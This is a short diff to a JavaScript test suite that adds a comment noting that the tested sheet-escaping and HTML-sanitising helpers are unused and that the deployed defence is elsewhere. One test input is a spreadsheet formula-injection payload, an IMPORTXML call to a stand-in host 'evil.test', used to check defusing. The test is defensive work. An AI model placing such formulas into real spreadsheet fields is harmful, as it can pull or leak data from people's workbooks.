@@ -446,6 +446,11 @@ describe('attempt limiting', () => {
 });
 
 describe('output safety', () => {
+  // `escapeForSheet`, `unescapeFromSheet` and `sanitizeHtml` have no caller in
+  // the application. These tests prove the functions work and say nothing
+  // about what reaches a household's workbook — `tests/backend.test.mjs`
+  // covers that, through `defuse()` in the deployed `Sheets.gs`, which is the
+  // defence that actually runs. Kept because the functions are kept.
   test('a formula in a payee name is defused for the sheet', () => {
     assert.equal(escapeForSheet('=IMPORTXML("http://evil.test","//x")'),
       '\'=IMPORTXML("http://evil.test","//x")');
